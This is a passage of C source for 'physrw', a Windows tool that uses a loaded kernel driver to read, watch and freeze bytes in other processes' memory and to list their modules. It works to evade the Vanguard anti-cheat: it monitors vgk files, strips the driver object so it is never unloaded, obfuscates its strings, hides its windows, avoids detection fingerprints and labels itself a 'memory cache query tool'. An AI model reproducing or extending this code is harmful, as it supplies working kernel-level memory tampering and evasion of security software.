    printf("[+] w0 pid %llu (%s) va=%llx len=%u via %s=%llx - DRIVERLESS "
           "(pin views, fresh v2p)\n",
           (unsigned long long)pid, p.name, (unsigned long long)va, len, wd,
           (unsigned long long)dtb);
    printf("[t=0 baseline]\n");
    hexdump(va, prev, len);
    if (!iv) return 0;
    unsigned char cur[0x1000];
    UINT64 t0 = GetTickCount64();
    int changes = 0, repins = 0, repin_fails = 0;
    DWORD backoff = iv;                      // escalates on dead pin reads
    for (;;) {
        Sleep(backoff);
        if (t_dead) return 0;
        pa_nc = 1;                           // fresh v2p every sample
        BOOL ok = rd_kva(dtb, va, cur, len);
        pa_nc = 0;
        if (ok) {
            backoff = iv; repin_fails = 0;
            if (memcmp(cur, prev, len)) {
                changes++;
                stamp_ms(t0);
                printf(" #%d\n", changes);
                hexdump(va, cur, len);
                memcpy(prev, cur, len);
            }
            continue;
        }
        // pin miss (page migrated / PT moved / pid recycled): micro re-pin
        if (++repin_fails > 12) { printf("[-] w0: repins exhausted\n"); return 1; }
        if (backoff < 500) backoff *= 2;
        repins++;
        if (repins <= 3 || repins % 20 == 0)
            printf("[.] w0 repin #%d (backoff %lu ms)\n", repins, backoff);
        if (!dev_acquire()) continue;
        t_autopin = 1;
        if (walk_procs(FALSE, pid, &p)) {
            UINT64 nd = target_dtb(&p, va, &wd);
            if (nd != dtb) { printf("[+] new dtb=%llx\n", (unsigned long long)nd); dtb = nd; }
            if (rd_kva(dtb, va, cur, len)) memcpy(prev, cur, len);
        } else printf("[-] pid gone\n");
        t_autopin = 0;
        dev_release();
    }
}

static int cmd_freeze0(UINT64 pid, UINT64 va, const wchar_t *hexstr, DWORD iv)
{
    unsigned char want[0x1000];
    int n = 0;
    for (const wchar_t *q = hexstr; *q; q += 2) {
        if (!iswxdigit(q[0]) || !q[1] || !iswxdigit(q[1]) || n >= (int)sizeof want) { n = 0; break; }
        want[n++] = (UINT8)((wnum2(q[0]) << 4) | wnum2(q[1]));
    }
    if (n <= 0) { printf("[-] invalid hexstring\n"); return 1; }
    EPINFO p;
    const char *wd = "";
    UINT64 dtb = 0;
    // setup window: resolve + pin the read path (autopin covers PT chain
    // and the data page on the baseline read)
    if (!dev_acquire()) { printf("[-] f0 setup window failed\n"); return 1; }
    t_autopin = 1;
    int bad = 0;
    if (!walk_procs(FALSE, pid, &p))
        { printf("[-] pid %llu not found\n", (unsigned long long)pid); bad = 1; }
    else {
        dtb = target_dtb(&p, va, &wd);
        pa_nc = 1;
        unsigned char cur0[0x1000];
        if (!pa_of(dtb, va) || !rd_kva(dtb, va, cur0, (UINT32)n)) {
            printf("[-] initial read failed (unmapped or paged out)\n");
            bad = 1;
        }
        pa_nc = 0;
    }
    t_autopin = 0;
    dev_release();
    if (bad) return 1;
    pa_nc = 1;
    UINT64 pa = pa_of(dtb, va);
    pa_nc = 0;
    if (!pa) { printf("[-] v2p failed\n"); return 1; }
    printf("[+] f0 pid %llu (%s) via %s=%llx pa=%llx - want ",
           (unsigned long long)pid, p.name, wd, (unsigned long long)dtb,
           (unsigned long long)pa);
    hexline(want, (UINT32)n); printf("\n");

    UINT64 block = 0, blockva = 0;              // current RW mapping (block start)
    MAPVIEW rwv;                                 // the one rw view (reused)
    memset(&rwv, 0, sizeof rwv);
    int remaps = 0, corrections = 0, remap_fails = 0;
    DWORD backoff = iv;
    unsigned char cur[0x1000];
    UINT64 t0 = GetTickCount64();
    for (;;) {
        Sleep(backoff);
        if (t_dead) {
            if (rwv.m.base && hdev && hdev != INVALID_HANDLE_VALUE) wunmap(&rwv);
            return 0;
        }
        pa_nc = 1;                              // fresh v2p every sample
        pa = pa_of(dtb, va);
        BOOL rdok = pa ? rd_kva(dtb, va, cur, (UINT32)n) : FALSE;
        pa_nc = 0;
        if (!pa || !rdok) {
            if (++remap_fails > 12) { printf("[-] f0: repins exhausted\n"); return 1; }
            if (backoff < 500) backoff *= 2;
            if (!dev_acquire()) continue;       // micro re-pin window
            t_autopin = 1;
            if (walk_procs(FALSE, pid, &p)) {
                UINT64 nd = target_dtb(&p, va, &wd);
                if (nd != dtb) { printf("[+] new dtb=%llx\n", (unsigned long long)nd); dtb = nd; }
                pa_nc = 1;
                rd_kva(dtb, va, cur, (UINT32)n);
                pa_nc = 0;
            } else printf("[-] pid gone\n");
            t_autopin = 0;
            dev_release();
            continue;
        }
        if ((pa & ~0xFFFFULL) != block || !blockva) {
            // target moved (or first pass): micro-window; unwind the OLD view
            // first (leak law), then map the new one RW
            if (!dev_acquire()) {
                if (++remap_fails > 12) { printf("[-] remap window failed\n"); return 1; }
                if (backoff < 500) backoff *= 2;
                continue;
            }
            if (rwv.m.base) wunmap(&rwv);       // old view gone BEFORE new one
            memset(&rwv, 0, sizeof rwv);
            rwv.m.size = 0x10000; rwv.m.phys = pa & ~0xFFFFULL; rwv.m.write = 1;
            DWORD n2 = 0;
            BOOL ok = DeviceIoControl(hdev, MAP, &rwv.m, sizeof rwv.m, &rwv.m,
                                      sizeof rwv.m, &n2, NULL) && rwv.m.base;
            dev_release();
            if (!ok) {
                rwv.m.base = 0; blockva = 0;
                if (++remap_fails > 12) { printf("[-] RW remap failed\n"); return 1; }
                if (backoff < 500) backoff *= 2;
                continue;
            }
            block = pa & ~0xFFFFULL;
            blockva = rwv.m.base + (block - rwv.m.phys);
            remaps++; remap_fails = 0; backoff = iv;
            if (remaps <= 3 || remaps % 20 == 0)
                printf("[.] RW remap #%d block=%llx view=%llx\n", remaps,
                       (unsigned long long)block, (unsigned long long)blockva);
        }
        unsigned char *wptr = (unsigned char *)(blockva + (pa - block));
        if (IsBadWritePtr(wptr, (UINT32)n)) {
            blockva = 0;                        // dead view: remap next round,
            if (backoff < 500) backoff *= 2;    // with backoff - never a storm
            continue;
        }
        if (memcmp(cur, want, (UINT32)n)) {
            corrections++;
            memcpy(wptr, want, (UINT32)n);
            pa_nc = 1;
            BOOL rb = rd_kva(dtb, va, cur, (UINT32)n);
            pa_nc = 0;
            if (!rb || memcmp(cur, want, (UINT32)n)) {
                stamp_ms(t0);
                printf(" [!] fix #%d readback MISMATCH\n", corrections);
                blockva = 0;                    // force remap next round
            } else {
                stamp_ms(t0);
                printf(" fix #%d was ", corrections);
                hexline(cur, (UINT32)n); printf("\n");
            }
        }
    }
}

// NO-DEVICE commands: run without any window. rc 2 = view dead.
static int cmd_proberd(UINT64 va, UINT32 len)
{
    if (!len || len > 0x1000) len = 0x1000;
    if (IsBadReadPtr((void *)va, len)) {
        printf("[-] va %llx DEAD (view did not survive)\n", (unsigned long long)va);
        return 2;
    }
    unsigned char b[0x1000];
    memcpy(b, (void *)va, len);
    hexdump(va, b, len);
    return 0;
}

static int cmd_probewr(UINT64 va, const wchar_t *hexstr)
{
    unsigned char m[0x1000];
    int n = 0;
    for (const wchar_t *q = hexstr; *q; q += 2) {
        if (!iswxdigit(q[0]) || !q[1] || !iswxdigit(q[1]) || n >= (int)sizeof m) { n = 0; break; }
        m[n++] = (UINT8)((wnum2(q[0]) << 4) | wnum2(q[1]));
    }
    if (n <= 0) { printf("[-] invalid hexstring\n"); return 1; }
    if (IsBadWritePtr((void *)va, (UINT32)n)) {
        printf("[-] va %llx DEAD-W (view did not survive)\n", (unsigned long long)va);
        return 2;
    }
    unsigned char old[0x1000]; memcpy(old, (void *)va, (UINT32)n);
    memcpy((void *)va, m, (UINT32)n);
    unsigned char back[0x1000]; memcpy(back, (void *)va, (UINT32)n);
    printf("[wr] old "), hexline(old, (UINT32)n), printf("\n");
    printf("[wr] new "), hexline(back, (UINT32)n), printf("\n");
    return memcmp(back, m, (UINT32)n) ? 3 : 0;
}

static int cmd_mod(UINT64 pid)
{
    EPINFO p;
    if (!walk_procs(FALSE, pid, &p)) { printf("[-] pid %llu not found\n",
                                              (unsigned long long)pid); return 1; }
    const char *w; UINT64 dtb = target_dtb(&p, 0, &w);
    printf("[+] mod pid %llu (%s) via %s=%llx\n",
           (unsigned long long)pid, p.name, w, (unsigned long long)dtb);
    UINT64 peb = 0;
    if (!rd_kva(st.cr3, p.kva + O_PEB, &peb, 8)) {
        printf("[-] read EPROCESS+%x (PEB ptr) failed\n", O_PEB);
        return 1;
    }
    if (!is_uva(peb)) {
        printf("VFAIL O_PEB: EPROCESS+0x%x = %llx is not a user VA - 0x550 hypothesis wrong\n",
               O_PEB, (unsigned long long)peb);
        return 1;
    }
    printf("[+] PEB = %llx (O_PEB=0x%x OK)\n", (unsigned long long)peb, O_PEB);
    UINT64 ldr = 0;
    if (!rd_kva(dtb, peb + P_LDR, &ldr, 8) || !is_uva(ldr)) {
        printf("VFAIL P_LDR: PEB+0x%x = %llx not a user VA - 0x18 hypothesis wrong "
               "(or wrong dtb)\n", P_LDR, (unsigned long long)ldr);
        return 1;
    }
    printf("[+] PEB->Ldr = %llx (P_LDR=0x%x OK)\n", (unsigned long long)ldr, P_LDR);
    UINT64 head = ldr + L_INLOAD;
    UINT64 lh[2];
    if (!rd_kva(dtb, head, lh, 16) || !is_uva(lh[0])) {
        printf("VFAIL L_INLOAD: head Flink %llx not a user VA\n",
               (unsigned long long)lh[0]);
        return 1;
    }
    UINT64 link = lh[0];                    // first ENTRY, not the head itself
    int first = 1;
    for (int i = 0; i < 256; i++) {
        UINT64 l2[2];
        if (!rd_kva(dtb, link, l2, 16)) {
            printf("[-] list read fail @ %llx after %d modules\n",
                   (unsigned long long)link, i);
            return 1;
        }
        UINT64 e = link;                    // InLoadOrderLinks is at entry +0
        UINT64 dllbase = 0, size = 0, nbuf = 0;
        UINT16 nlen = 0;
        rd_kva(dtb, e + L_DLLBASE, &dllbase, 8);
        rd_kva(dtb, e + L_SIZEOF, &size, 8);
        rd_kva(dtb, e + L_NAME, &nlen, 2);
        rd_kva(dtb, e + L_NAME + 8, &nbuf, 8);
        char nm[64] = {0};
        BOOL name_ok = nlen && !(nlen & 1) && nlen <= 128 && is_uva(nbuf);
        if (name_ok) {
            unsigned char raw[128];
            UINT32 bytes = nlen < 120 ? nlen : 120;
            if (rd_kva(dtb, nbuf, raw, bytes)) {
                for (UINT32 k = 0; k < bytes / 2 && k < sizeof nm - 1; k++) {
                    unsigned short c = (unsigned short)(raw[2*k] | (raw[2*k+1] << 8));
                    nm[k] = (c >= 32 && c < 127) ? (char)c : '?';
                }
            } else name_ok = FALSE;
        }
        if (first) {                        // runtime validation gate: EXE module
            UINT16 mz = 0;
            if (!is_uva(dllbase) || !rd_kva(dtb, dllbase, &mz, 2) || mz != 0x5A4D) {
                printf("VFAIL L_DLLBASE: first module DllBase=%llx mz=%04x - "
                       "+0x30 hypothesis wrong (or wrong dtb / paged out)\n",
                       (unsigned long long)dllbase, mz);
                return 1;
            }
            printf("[+] validation PASS: first module MZ @ %llx - "
                   "O_PEB/P_LDR/L_INLOAD/L_DLLBASE consistent\n",
                   (unsigned long long)dllbase);
            first = 0;
        }
        if (!name_ok)
            printf("  [%3d] base=%016llx size=%8llx <name offs +0x%x/+0x%x broken: "
                   "len=%u buf=%llx>\n", i, (unsigned long long)dllbase,
                   (unsigned long long)size, L_NAME, L_NAME + 8, nlen,
                   (unsigned long long)nbuf);
        else
            printf("  [%3d] base=%016llx size=%8llx %s\n", i,
                   (unsigned long long)dllbase, (unsigned long long)size, nm);
        link = l2[0];
        if (link == head || !is_uva(link)) break;
    }
    return 0;
}

static void usage(const wchar_t *p0)
{
    printf("physrw - memory cache query tool\n"
           "usage:\n"
           "  %ls auto                     derive everything (scan -> cr3/nt/sep)\n"
           "  %ls load <svcname>           load driver as <svcname> (device \\\\.\\<svcname>)\n"
           "  %ls init <kernel_cr3_hex> [nt_base_hex] [sep_hex]  manual config\n"
           "  %ls procs                    pid/name/dtb table\n"
           "  %ls rd   <pid> <va_hex> [len]   one-shot read (len<=1000h)\n"
           "  %ls wr   <pid> <va_hex> <hexbytes..>  one-shot write + readback\n"
           "  %ls watch <pid> <va_hex> <len> [interval_ms]  read-loop, changes only\n"
           "  %ls freeze <pid> <va_hex> <hexstring> [interval_ms]  write-hold loop\n"
           "  %ls mod  <pid>               module bases via target PEB\n"
           "  %ls kr   <va_hex> [len]      kernel-VA read via cr3\n"
           "  %ls %-25ls config-file digest report\n"
           "  %ls maps / %-10ls pin-view status / warm the pin set\n"
           "  %ls %-6ls / %-5ls daemon start / stop\n",
           p0, p0, p0, p0, p0, p0, p0, p0, p0, p0,
           dq(OB_CVG, OB_CVG_N), p0, dq(OB_CFM, OB_CFM_N),
           p0, dq(OB_CDT, OB_CDT_N), dq(OB_CDS, OB_CDS_N));
}

// Phase 0 daemon implementation

static void send_term(FILE *f, int rc)
{
    fprintf(f, "\x1E%d\n", rc);
    fflush(f);
}

static int pipe_forward(int argc, wchar_t **argv)
{
    wchar_t pn_buf[80]; pipe_name(pn_buf, 80);
    HANDLE p = CreateFileW(PHYSRW_PIPE, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (p == INVALID_HANDLE_VALUE &&
        GetLastError() == ERROR_PIPE_BUSY && WaitNamedPipeW(PHYSRW_PIPE, 300))
        p = CreateFileW(PHYSRW_PIPE, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                        OPEN_EXISTING, 0, NULL);
    if (p == INVALID_HANDLE_VALUE) return -1;
    // handshake line 1): daemon drops us silently without it
    {
        char al[64];
        int aln = _snprintf(al, sizeof al, "%s\n",
                            xo_a((char[24]){0}, 24, OB_AUTH, OB_AUTH_N),
                            (unsigned long long)pipe_secret());
        DWORD aw = 0;
        if (aln <= 0 || !WriteFile(p, al, (DWORD)aln, &aw, NULL)
            || aw != (DWORD)aln) {
            CloseHandle(p);
            return -1;
        }
    }
    if (!argc || !argv[1] || !wq(argv[1], OB_CDS, OB_CDS_N))
        printf("[pipe] daemon-served\n");                         // mode marker
    char line[4096]; size_t pos = 0;
    for (int i = 1; i < argc; i++) {
        if (i > 1) line[pos++] = ' ';
        const wchar_t *a = argv[i];
        int q = !*a || wcspbrk(a, L" \t\n\"");
        if (q) line[pos++] = '"';
        for (; *a; a++) {
            if (*a == L'"' && q) line[pos++] = '"';    // inner quote -> ""
            int n = WideCharToMultiByte(CP_UTF8, 0, a, 1, line + pos,
                                        (int)(sizeof line - pos - 2), NULL, NULL);
            if (n <= 0 || pos >= sizeof line - 2) { CloseHandle(p); return -1; }
            pos += (size_t)n;
        }
        if (q) line[pos++] = '"';
    }
    line[pos++] = '\n';
    DWORD wr = 0;
    if (!WriteFile(p, line, (DWORD)pos, &wr, NULL) || wr != (DWORD)pos) {
        CloseHandle(p);
        return -1;
    }
    char buf[4096];
    int rc = -1, sawterm = 0;
    for (;;) {
        DWORD n = 0;
        if (!ReadFile(p, buf, sizeof buf, &n, NULL) || !n) break;
        char *t = memchr(buf, '\x1E', n);     // 0x1E never appears inside UTF-8
        if (t) {
            fwrite(buf, 1, (size_t)(t - buf), stdout);
            rc = atoi(t + 1);
            sawterm = 1;
            break;
        }
        fwrite(buf, 1, n, stdout);
    }
    fflush(stdout);
    CloseHandle(p);
    if (!sawterm) {
        printf("[-] daemon dropped the connection mid-reply (no terminator)\n");
        return 1;
    }
    return rc;
}

// CRT-dialect splitter (matches pipe_forward's quoter):
// space/tab separate, "..." groups, "" inside quotes = one literal quote
static int split_line(const wchar_t *s, wchar_t **av, int max, wchar_t *scratch)
{
    int n = 0;
    wchar_t *o = scratch;
    while (*s == L' ' || *s == L'\t') s++;
    while (*s && n < max - 1) {
        av[n++] = o;
        int inq = 0;
        while (*s && (inq || (*s != L' ' && *s != L'\t'))) {
            if (*s == L'"') {
                if (inq && s[1] == L'"') { *o++ = L'"'; s += 2; continue; }
                inq = !inq; s++;
            } else *o++ = *s++;
        }
        *o++ = 0;
        while (*s == L' ' || *s == L'\t') s++;
    }
    av[n] = NULL;
    return n;
}

// every command word the engine understands - the daemon's authed gate
// (conn_thread) and the DLL hosts' claim-check share this single list.
static int is_our_cmd(const wchar_t *s)
{
static const unsigned char OB_CMDS[165] = {42,41,51,62,45,95,18,5,98,20,22,101,17,6,28,10,50,91,58,47,59,58,26,4,98,14,11,1,102,12,26,105,62,40,40,50,46,95,4,18,22,2,22,17,102,56,55,13,41,47,61,47,42,95,1,20,22,12,100,4,102,14,6,0,46,91,47,56,42,47,1,21,10,99,8,10,7,3,104,28,52,55,51,60,58,95,22,6,9,7,5,17,102,8,5,26,46,41,53,45,94,55,9,5,7,99,2,16,10,11,5,8,42,91,49,60,46,44,96,12,3,19,23,0,10,1,104,4,59,43,62,52,57,95,16,19,13,1,1,23,2,103,24,27,53,57,57,42,44,95,23,0,22,0,12,85,102,1,26,12,63,33,57,109,94};
#define OB_CMDS_N 165
    static wchar_t cmds[512];
    static int init;
    if (!init) { xo_w(cmds, 512, OB_CMDS, OB_CMDS_N); init = 1; }
    for (wchar_t *p = cmds; *p; p += wcslen(p) + 1)
        if (!wcscmp(s, p)) return 1;
    return 0;
}

static int dispatch(int argc, wchar_t **argv);  // defined below

static int pipe_read_line(HANDLE hp, char *out, DWORD cap, DWORD ms)
{
    DWORD tot = 0, idle = 0;
    while (tot < cap - 1) {
        DWORD avail = 0;
        if (!PeekNamedPipe(hp, NULL, 0, NULL, &avail, NULL) || !avail) {
            if (idle >= ms) break;
            Sleep(10);
            idle += 10;
            continue;
        }
        idle = 0;
        DWORD n = 0;
        char ch = 0;
        if (!ReadFile(hp, &ch, 1, &n, NULL) || !n) break;
        if (ch == '\n') break;
        out[tot++] = ch;
    }
    out[tot] = 0;
    return (int)tot;
}

static unsigned __stdcall conn_thread(void *arg)
{
    HANDLE hp = (HANDLE)arg;
    char line[4096];
    {
        char ab[80], want[80];
        pipe_read_line(hp, ab, sizeof ab, 2000);
        _snprintf(want, sizeof want, "%s",
                  xo_a((char[24]){0}, 24, OB_AUTH, OB_AUTH_N),
                  (unsigned long long)pipe_secret());
        want[sizeof want - 1] = 0;
        if (strcmp(ab, want)) {
            char junk[512];
            DWORD n = 0;
            while (PeekNamedPipe(hp, NULL, 0, NULL, &n, NULL) && n)
                if (!ReadFile(hp, junk, sizeof junk, &n, NULL) || !n) break;
            Sleep(120);                // no instant reset - that's a fingerprint
            CloseHandle(hp);
            return 2;
        }
    }
    pipe_read_line(hp, line, sizeof line, 5000);
    int fd = _open_osfhandle((intptr_t)hp, 0);
    FILE *f = fd >= 0 ? _wfdopen(fd, L"w") : NULL;
    if (!f) { if (fd >= 0) _close(fd); CloseHandle(hp); return 1; }
    setvbuf(f, NULL, _IONBF, 0);
    t_out = f; t_dead = 0;
    {
        ULONG cpid = 0;                    // exclude the client process from
        if (GetNamedPipeClientProcessId(hp, &cpid)) // walks: its fresh EPROCESS
            t_cli_pid = cpid;              // would pin-miss every procs call
    }

    wchar_t wline[4096];
    MultiByteToWideChar(CP_UTF8, 0, line, -1, wline, 4096);
    wchar_t *av[64], scratch[4096];
    int n = split_line(wline, av, 64, scratch);
    wchar_t *dav[66];
    dav[0] = (wchar_t *)L"physrw";
    for (int i = 0; i < n && i < 64; i++) dav[i + 1] = av[i];
    int dargc = n + 1;

    if (n < 1 || !is_our_cmd(av[0])) {
        if (!t_dead) send_term(f, 1);
        fclose(f);
        t_out = NULL;
        return 1;
    }

    if (n > 0 && wq(av[0], OB_CDS, OB_CDS_N)) {
        printf("[+] bye\n");
        send_term(f, 0);
        fflush(f);
        EnterCriticalSection(&g_disp);     // drain any in-flight short command
        LeaveCriticalSection(&g_disp);     // (never cut a hide splice in half)
        for (int i = 0; !g_persist && i < 30 && g_win_refs > 0; i++) Sleep(100);
        CloseHandle(hdev);
        if (hsec) CloseHandle(hsec);
        ExitProcess(0);
    }
    int streaming = 0;
    if (n > 0) {
        if (!wcscmp(av[0], L"watch")) {
            streaming = dargc >= 6 && wnum(dav[5]) != 0;
            if (streaming) { av[0] = (wchar_t *)dq(OB_CW0, OB_CW0_N); dav[1] = av[0]; }
        } else if (!wcscmp(av[0], L"freeze")) {
            streaming = !(dargc >= 6 && wnum(dav[5]) == 0);  // default iv=50
            if (streaming) { av[0] = (wchar_t *)dq(OB_CF0, OB_CF0_N); dav[1] = av[0]; }
        }
    }
    // no-device commands never open a window (view-survival probes,
    // pin-based streams, help)
    int nowin = n > 0 && (!wcscmp(av[0], L"maps") || wq(av[0], OB_CPR, OB_CPR_N)
                          || wq(av[0], OB_CPW, OB_CPW_N) || wq(av[0], OB_CW0, OB_CW0_N)
                          || wq(av[0], OB_CF0, OB_CF0_N) || !wcscmp(av[0], L"help")
                          || !wcscmp(av[0], L"-h"));
    int softwin = !nowin && !streaming && pin_n > 0 &&
                  (!wcscmp(av[0], L"procs") || !wcscmp(av[0], L"rd")
                   || !wcscmp(av[0], L"kr") || !wcscmp(av[0], L"mod")
                   || wq(av[0], OB_CVG, OB_CVG_N));
    if (!nowin && !streaming) EnterCriticalSection(&g_disp);
    if (nowin) {
        int rc2 = dispatch(dargc, dav);
        if (!t_dead) send_term(f, rc2);
        fclose(f);
        t_out = NULL;
        return rc2 ? 1 : 0;
    }
    if (softwin) {
        int rc2 = 1;
        FILE *nulf = _wfopen(L"NUL", L"w");
        if (nulf) {
            setvbuf(nulf, NULL, _IONBF, 0);
            FILE *save = t_out;
            t_out = nulf;                      // attempt output discarded
            t_unpin = 0;
            rc2 = dispatch(dargc, dav);
            fclose(nulf);
            t_out = save;
        }
        if (!nulf || t_unpin || rc2) {         // pin miss / error: windowed rerun
            if (dev_acquire()) {
                t_autopin = 1;                 // pin what we touch: next call driverless
                rc2 = dispatch(dargc, dav);
                t_autopin = 0;
                dev_release();
            } else {
                fprintf(f, "[-] device window failed\n");
                rc2 = 1;
            }
        }
        LeaveCriticalSection(&g_disp);
        if (!t_dead) send_term(f, rc2);
        fclose(f);
        t_out = NULL;
        return rc2 ? 1 : 0;
    }
    if (!dev_acquire()) {
        if (!streaming) LeaveCriticalSection(&g_disp);
        fprintf(f, "[-] device window failed\n");
        if (!t_dead) send_term(f, 1);
        fclose(f);
        t_out = NULL;
        return 1;
    }
    t_autopin = 1;                         // pin what we touch: next call driverless
    int rc = dargc > 1 ? dispatch(dargc, dav) : 1;
    t_autopin = 0;
    dev_release();
    if (!streaming) LeaveCriticalSection(&g_disp);
    if (!t_dead) send_term(f, rc);
    fclose(f);                             // owns the pipe handle
    t_out = NULL;
    return 0;
}

static BOOL CALLBACK whide_cb(HWND h, LPARAM lp)
{
    DWORD pid = 0;
    (void)lp;
    GetWindowThreadProcessId(h, &pid);
    if (pid == GetCurrentProcessId() && IsWindowVisible(h)) ShowWindow(h, SW_HIDE);
    return TRUE;
}

static unsigned __stdcall whide_thread(void *arg)
{
    (void)arg;
    for (;;) { Sleep(2000); EnumWindows(whide_cb, 0); }
    return 0;                                      // unreachable
}

static volatile unsigned long long g_cfgd_h;
static volatile int g_cfgd_have;
static unsigned __stdcall cfgd_thread(void *arg)
{
    (void)arg;
    for (;;) {
        Sleep(60000);
        unsigned long long h = 0, s = 0; DWORD e = 0;
        int have = vgkdat_fnv(&h, &s, &e);
        if (!g_cfgd_have) { g_cfgd_have = 1; g_cfgd_h = h; continue; }
        if (have && h == g_cfgd_h) continue;       // unchanged
        if (!have && g_cfgd_h == 0) continue;      // absent -> absent
        unsigned long long old = g_cfgd_h;
        g_cfgd_h = h;
        char an[12];
        vgkdat_name(an, sizeof an);
        printf("[cfgd!!] %s CHANGED %016llx -> %016llx (size %I64u) t=%lu\n",
               an, old, h, s, GetTickCount());
        wchar_t de[MAX_PATH], mf[MAX_PATH + 32];
        HMODULE m = g_self ? (HMODULE)g_self : NULL;  // DLL dir, not System32
        if (GetModuleFileNameW(m, de, MAX_PATH)) {
            wchar_t *sl = wcsrchr(de, L'\\');
            if (sl) {
                sl[1] = 0;
                _snwprintf(mf, MAX_PATH + 32, L"%ls%ls", de,
                           xo_w((wchar_t[16]){0}, 16, OB_CFD, OB_CFD_N));
                mf[MAX_PATH + 31] = 0;
                HANDLE hf = CreateFileW(mf, GENERIC_WRITE, 0, NULL,
                                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hf != INVALID_HANDLE_VALUE) {
                    char l[160];
                    int ln2 = _snprintf(l, sizeof l,
                        "%s delta t=%lu\nold fnv=%016llx\nnew fnv=%016llx size=%llu\n",
                        an, GetTickCount(), old, h, s);
                    DWORD w2 = 0;
                    WriteFile(hf, l, ln2, &w2, NULL);
                    CloseHandle(hf);
                }
            }
        }
    }
    return 0;                                      // unreachable
}

static int daemon_main(void)
{
    g_daemon = 1;
    InitializeCriticalSection(&g_disp);
    {  // stale ephemeral file from a crashed prior daemon (module dead by
        // now): delete before the first window re-materializes it
        wchar_t ep[MAX_PATH];
        ephem_path(ep, MAX_PATH);
        if (ep[0]) posix_unlink(ep);
    }
    {
        uintptr_t t = _beginthreadex(NULL, 0, whide_thread, NULL, 0, NULL);
        if (t) CloseHandle((HANDLE)t);
    }
    {  // vgk0001.dat delta watcher (60 s, marker + boot log)
        uintptr_t t = _beginthreadex(NULL, 0, cfgd_thread, NULL, 0, NULL);
        if (t) CloseHandle((HANDLE)t);
    }
    {
        wchar_t dw[MAX_PATH], dlp[MAX_PATH + 32], trc[MAX_PATH + 32];
        DWORD attr = INVALID_FILE_ATTRIBUTES;
        if (GetModuleFileNameW(NULL, dw, MAX_PATH)) {
            wchar_t *s = wcsrchr(dw, L'\\');
            if (s) {
                s[1] = 0;
                _snwprintf(dlp, MAX_PATH + 32, L"%ls%ls", dw, oname(ON_DTL, ON_DTL_LEN));
                _snwprintf(trc, MAX_PATH + 32, L"%ls%ls", dw, oname(ON_TRC, ON_TRC_LEN));
                dlp[MAX_PATH + 31] = 0; trc[MAX_PATH + 31] = 0;
                attr = GetFileAttributesW(trc);
            }
        }
        if (attr != INVALID_FILE_ATTRIBUTES) _wfreopen(dlp, L"w", stdout);
        else _wfreopen(L"NUL", L"w", stdout);
    }
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("[d] boot t=%lu\n", GetTickCount());
    // survive ssh-session teardown: drop our console (CREATE_NO_WINDOW gave us
    // our own hidden one; freeing it removes us from any console-close kill)
    FreeConsole();
    load_state();
    printf("[d] state loaded t=%lu cr3=%llx dev=%ls\n",
           GetTickCount(), (unsigned long long)st.cr3, st.devn);
    InitializeCriticalSection(&g_win);
    int vl = vgk_live();
    printf("[d] vlive=%d t=%lu\n", vl, GetTickCount());
    if (dev_acquire()) {
        if (vl && st.cr3) {
            g_persist = (cmd_omstrip(2) == 0) || !g_fresh_load;
            if (!g_persist) printf("[d] persistent strip failed - windowing\n");
        }
        if (!st.cr3) { printf("[d] cold - auto\n"); cmd_auto(); }
        else if (st.nt) {
            // cr3 (1ad002) is boot-stable, nt KASLR is NOT - a stale nt from
            // a previous boot must not survive into command era
            unsigned char mz[2] = { 0, 0 };
            if (!rd_kva(st.cr3, st.nt, mz, 2) || mz[0] != 'M' || mz[1] != 'Z') {
                printf("[d] stale nt (MZ fail) - auto t=%lu\n", GetTickCount());
                cmd_auto();
            }
        }
        // cold boot could not strip before auto (no cr3 yet) - strip now
        if (vl && !g_persist && st.cr3) {
            g_persist = (cmd_omstrip(2) == 0) || !g_fresh_load;
            if (!g_persist) printf("[d] persistent strip failed - windowing\n");
        }
        t_autopin = 1;
        pin_add(st.cr3 & ~0xFFFULL);
        if (st.sep) pin_add(st.sep & ~0xFFFULL);
        walk_procs(TRUE, 0, NULL);
        t_autopin = 0;
        printf("[d] device %ls path=%d win-capable=%d pins=%d persist=%d\n",
               g_dev, g_path, g_win_capable, pin_n, g_persist);
        if (!g_persist) {
            dev_release();
        } else {
            // persistent: the boot reference is never released - refs never
            // reach 0, so nothing ever calls NtUnloadDriver this boot
            printf("[d] PERSISTENT hold: \\Driver stripped, handle held until death\n");
        }
    } else {
        printf("[d] first window FAILED t=%lu\n", GetTickCount());
    }
    wchar_t pn_buf[80]; pipe_name(pn_buf, 80);
    HANDLE np = CreateNamedPipeW(PHYSRW_PIPE,
        PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES, 65536, 65536, 0, NULL);
    if (np == INVALID_HANDLE_VALUE) { printf("[d] CreateNamedPipe err=%lu\n", GetLastError()); return 1; }
    printf("[d] pipe created t=%lu\n", GetTickCount());
    for (;;) {
        if (!ConnectNamedPipe(np, NULL) && GetLastError() != ERROR_PIPE_CONNECTED)
            return 1;
        uintptr_t t = _beginthreadex(NULL, 0, conn_thread, (void *)np, 0, NULL);
        if (!t) return 1;
        CloseHandle((HANDLE)t);
        np = CreateNamedPipeW(PHYSRW_PIPE, PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES, 65536, 65536, 0, NULL);
        if (np == INVALID_HANDLE_VALUE) return 1;
    }
}

// definitive liveness probe: connect + empty line + close. WaitNamedPipeW
// proved unreliable here; a real connect exercises the whole accept path.
static BOOL pipe_alive(void)
{
    wchar_t pn_buf[80]; pipe_name(pn_buf, 80);
    HANDLE p = CreateFileW(PHYSRW_PIPE, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (p == INVALID_HANDLE_VALUE) {
        DWORD e = GetLastError();
        if (e != ERROR_PIPE_BUSY && e != ERROR_FILE_NOT_FOUND) {
            static DWORD reported;                 // log unexpected code once
            if (reported != e) { reported = e; printf(" [pipe err=%lu]", e); }
        }
        if (e != ERROR_PIPE_BUSY || !WaitNamedPipeW(PHYSRW_PIPE, 300)) return FALSE;
        p = CreateFileW(PHYSRW_PIPE, GENERIC_READ | GENERIC_WRITE, 0, NULL,
